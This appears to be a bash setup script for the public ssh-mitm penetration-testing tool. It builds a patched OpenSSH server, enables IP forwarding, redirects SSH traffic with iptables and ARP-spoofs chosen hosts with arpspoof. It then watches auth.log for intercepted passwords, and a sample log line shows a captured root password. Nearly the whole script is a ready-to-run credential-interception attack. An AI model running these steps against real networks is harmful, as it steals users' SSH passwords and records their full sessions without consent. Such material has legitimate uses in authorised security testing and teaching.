#!/bin/bash
# SSH man-in-the-middle tool
# https://github.com/jtesta/ssh-mitm

# Update apt-get
sudo apt-get update
sudo apt install -y zlib1g-dev libssl-dev

# Download OpenSSL and verify its signature, need it you build OpenSSH on Kali:
mkdir -p /opt/ssh-mitm && cd /opt/ssh-mitm
wget https://www.openssl.org/source/openssl-1.0.2k.tar.gz
tar xzf openssl-1.0.2k.tar.gz && cd openssl-1.0.2k
./config --prefix=/usr/local/openssl-1.0.2k --openssldir=/usr/local/openssl-1.0.2k && make install

# Download OpenSSH v7.5p1 and verify its signature:
cd /opt/ssh-mitm
wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE_KEY.asc
wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.5p1.tar.gz
wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.5p1.tar.gz.asc
gpg --import RELEASE_KEY.asc
gpg --verify openssh-7.5p1.tar.gz.asc openssh-7.5p1.tar.gz

# Unpack the tarball, patch the sources, and compile it:
tar xzf openssh-7.5p1.tar.gz
wget https://raw.githubusercontent.com/jtesta/ssh-mitm/master/openssh-7.5p1-mitm.patch
patch -p0 < openssh-7.5p1-mitm.patch
mv openssh-7.5p1 openssh-7.5p1-mitm && cd openssh-7.5p1-mitm && ./configure --with-sandbox=no --with-ssl-dir=/usr/local/openssl-1.0.2k && make -j 5

# Create keys and setup environment:
sudo ssh-keygen -t ed25519 -f /usr/local/etc/ssh_host_ed25519_key < /dev/null
sudo ssh-keygen -t rsa -b 4096 -f /usr/local/etc/ssh_host_rsa_key < /dev/null
sudo useradd -m sshd; sudo useradd -m bogus && sudo chmod 0700 ~sshd ~bogus
sudo mkdir /var/empty; sudo cp ssh ~bogus/

# Running The Attack
cd /opt/ssh-mitm/openssh-7.5p1-mitm
sudo $PWD/sshd -f $PWD/sshd_config

# Enable IP forwarding:
sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo iptables -P FORWARD ACCEPT

# Allow connections to sshd and re-route forwarded SSH connections:
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 443

# ARP spoof a target(s) (Protip: do NOT spoof all the things! Your puny network interface won't likely be able to handle an entire network's traffic all at once. Only spoof a couple IPs at a time):
arpspoof -r -t 192.168.x.1 192.168.x.5

# Monitor auth.log. Intercepted passwords will appear here:
# Once a session is established, a full log of all input & output can be found in /home/bogus/session_*.txt.
sudo tail -f /var/log/auth.log
# May 1 16:42:39 kali-x64 sshd[18012]: INTERCEPTED PASSWORD: hostname: [192.XX.XX.101]; username: [root]; password: [lol123] [preauth]
sudo journalctl -t sshd